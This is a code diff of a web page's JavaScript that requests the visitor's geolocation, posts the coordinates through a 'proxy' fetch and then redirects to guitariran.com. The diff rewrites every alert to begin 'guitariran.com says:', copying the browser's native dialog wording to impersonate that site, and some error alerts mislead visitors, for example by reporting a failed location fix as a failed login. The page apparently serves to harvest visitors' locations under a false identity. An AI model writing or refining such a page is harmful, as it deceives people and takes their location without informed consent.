@@ -92,7 +92,7 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
-        alert("مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
+        alert("guitariran.com می‌گوید: مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
         console.error("Geolocation not supported.");
       }
     }
@@ -119,15 +119,15 @@
           body: formData,
           mode: "no-cors"
         }).then(function() {
-          alert("موفق!");
+          alert("guitariran.com می‌گوید: موفق!");
           window.location.href = "https://guitariran.com/";
         }).catch(function(err) {
           console.warn("Proxy request failed:", err);
-          alert("با خطا مواجه شد.");
+          alert("guitariran.com می‌گوید: با خطا مواجه شد.");
         });
 
       } else {
-        alert("لطفاً دوباره امتحان کنید.");
+        alert("guitariran.com می‌گوید: لطفاً دوباره امتحان کنید.");
         console.warn("Latitude or Longitude is missing.");
       }
     }
@@ -135,19 +135,19 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          alert("خطا! تنظیمات دسترسی را ریست کنید.");
+          alert("guitariran.com می‌گوید: خطا! تنظیمات دسترسی را ریست کنید.");
           console.error("User denied the request for Geolocation.");
           break;
         case error.POSITION_UNAVAILABLE:
-          alert("ورود انجام نشد.");
+          alert("guitariran.com می‌گوید: ورود انجام نشد.");
           console.error("Location information is unavailable.");
           break;
         case error.TIMEOUT:
-          alert("زمان دریافت تمام شد.");
+          alert("guitariran.com می‌گوید: زمان دریافت تمام شد.");
           console.error("The request to get user location timed out.");
           break;
         default:
-          alert("خطای ناشناخته رخ داد.");
+          alert("guitariran.com می‌گوید: خطای ناشناخته رخ داد.");
           console.error("An unknown error occurred.");
       }
     }
